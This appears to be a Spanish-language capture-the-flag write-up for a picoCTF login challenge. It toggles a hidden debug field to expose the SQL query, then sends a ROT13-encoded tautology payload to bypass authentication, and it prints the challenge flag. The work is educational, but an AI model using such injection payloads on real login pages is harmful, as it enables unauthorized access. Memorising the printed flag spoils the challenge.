## Objetivo:
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/40742/` ([link](https://jupiter.challenges.picoctf.org/problem/40742/)) or http://jupiter.challenges.picoctf.org:40742. Try to see if you can login as admin!

**Hints:**
1. Seems like the password is encrypted.

## Solución:
1. Al inspeccionar la página de inicio de sesión, podemos encontrar que hay un campo del formulario oculto llamado `debug`. por lo tanto lo establecemos en 1:

```html
<input type="hidden" name="debug" value="0">

<input type="hidden" name="debug" value="1">
```

2. Al establecer el valor en `1`  e ingresar alguna contraseña nos muestra:

```txt
password: hola
SQL query: SELECT * FROM admin where password = 'ubyn'

Login failed.
```

3. Al parecer la contraseña esta encriptada, notamos que se encripta usando ROT13 esto con ayuda de la herramienta [CyberChef](https://gchq.github.io/CyberChef/).

4. Codificamos con ROT13 `'OR '1'=='1'` y obtenemos  `'BE '1'=='1'` y esto se lo enviamos a la pagina para obtener la bandera: 

```txt
password: ' be '1'='1
SQL query: SELECT * FROM admin where password = '' or '1'='1'

Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}
```

### Flag: picoCTF{3v3n_m0r3_SQL_4424e7af}

## Notas adicionales:

### SQL Injection:
La inyección SQL es una técnica de inyección de código que podría destruir su base de datos. La inyección SQL es una de las técnicas de piratería web más comunes. La inyección SQL es la colocación de código malicioso en declaraciones SQL, a través de la entrada de una página web.

### ROT13:
El Cifrado ROT-13 es un tipo particular de Cifrado César, en el que el desplazamiento de las letras es de 13 posiciones. Tiene importancia porque el alfabeto (el inglés, sin la ñ) tiene 26 letras, por lo que al desplazar 13 dos veces, volvemos a la posición inicial. Por ejemplo, la letra A, al cifrarla mediante ROT-13, se convierte en la N y, si ciframos la N, se convierte en la A. Es decir, para descifrar un texto hay que hacer lo mismo que para cifrarlo.

## Referencias:
- https://www.w3schools.com/sql/sql_injection.asp
- https://es.wikipedia.org/wiki/ROT13